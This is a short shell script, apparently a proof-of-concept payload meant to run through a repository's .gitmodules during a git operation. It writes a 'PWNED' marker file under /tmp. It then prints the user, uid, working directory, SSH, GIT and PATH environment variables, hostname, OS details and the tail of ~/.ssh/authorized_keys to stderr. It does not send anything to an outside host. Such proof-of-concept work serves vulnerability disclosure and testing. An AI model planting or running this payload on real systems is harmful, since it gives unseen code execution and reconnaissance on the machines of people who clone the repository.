#!/usr/bin/env sh
# Run from .gitmodules

# Print a banner and attempt to create the 'pwned' files.
printf "\e[41;32m... Running code here ... !!!!!\n" >> /dev/stderr
echo "PWNED" > /tmp/pwned
# echo "PWNED" > /var/lib/rubrik/pwned

# Add commands to print system and user details
printf "\e[41;32m--- SYSTEM AND USER DETAILS ---\n" >> /dev/stderr

# 1. Print the current user and their effective ID
printf "\e[41;32mCurrent User: " >> /dev/stderr
whoami >> /dev/stderr 2>&1

printf "\e[41;32mUser ID: " >> /dev/stderr
id -u >> /dev/stderr 2>&1

# 2. Print the current working directory
printf "\e[41;32mCurrent Directory: " >> /dev/stderr
pwd >> /dev/stderr 2>&1

# 3. Print environment variables (useful for context like PATH, HOME, SSH_CLIENT)
printf "\e[41;32mEnvironment Variables (filtered): \n" >> /dev/stderr
env | grep -E '(USER|HOME|PATH|SSH|GIT)' >> /dev/stderr 2>&1

# 4. Print host information (hostname and OS release)
printf "\e[41;32mHostname: " >> /dev/stderr
hostname >> /dev/stderr 2>&1

printf "\e[41;32mOS Release: " >> /dev/stderr
uname -a >> /dev/stderr 2>&1

# 5. Print the last few lines of the authorized_keys file (if accessible)
printf "\e[41;32mAuthorized Keys (if accessible): \n" >> /dev/stderr
tail -n 3 ~/.ssh/authorized_keys >> /dev/stderr 2>&1

# Final closing message
printf "\e[41;32m... Execution Complete ...\n" >> /dev/stderr